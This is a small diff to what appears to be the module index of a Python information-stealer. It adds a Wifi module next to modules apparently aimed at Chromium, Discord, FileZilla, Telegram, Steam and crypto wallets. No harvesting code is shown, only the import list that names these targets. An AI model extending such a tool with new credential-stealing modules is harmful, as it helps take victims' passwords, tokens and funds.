@@ -7,5 +7,7 @@ from .system import System
 from .telegram import Telegram
 from .steam import Steam
 from .wallets import Wallets
+from .wifi import Wifi
 
-__all__ = ["Chromium", "Discord", "FileZilla", "Processes", "Screenshot", "System", "Telegram", "Steam", "Wallets"]
+__all__ = ["Chromium", "Discord", "FileZilla", "Processes", "Screenshot", "System", "Telegram", "Steam", "Wallets", "Wifi"]
+
